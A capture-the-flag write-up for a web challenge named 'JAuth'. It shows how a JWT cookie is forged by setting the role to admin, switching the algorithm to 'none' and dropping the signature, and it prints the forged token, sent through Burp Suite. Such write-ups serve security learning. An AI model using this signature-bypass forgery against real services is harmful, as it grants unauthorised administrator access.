# JAuth

*Category:* Web

---

# Description
> Most web application developers use third party components without testing their security. Some of the past affected companies are:

    Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
    Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
    VerticalScope (internet media company) - outdated version of vBulletin forum software used

Can you identify the components and exploit the vulnerable one?
---

# Attachment


---
# Solution

Once login with test account, server gives us a JWT cookie:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzM5NTcxMTkzODIzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IGFhcmNoNjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNS4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Mzk1NzExOTR9.Pb-YiMW5Wx9-th_Yd5qft6-P4Nx9x3mnR64Khskvmjc`

This decodes to:

![jauth1.png](Images/jauth1.png)

I tried just changing role to admin but it didn’t work so I changed the alg to “none” as well and removed the signature.

`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzM5NTcxMTkzODIzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IGFhcmNoNjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNS4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM5NTcxMTk0fQ.` 

![jauth2.png](Images/jauth2.png)

I did this in Burpsuite because when I modified the cookie in the web application, it still didn’t work (haven’t figured out why).

![jauth3.png](Images/jauth3.png)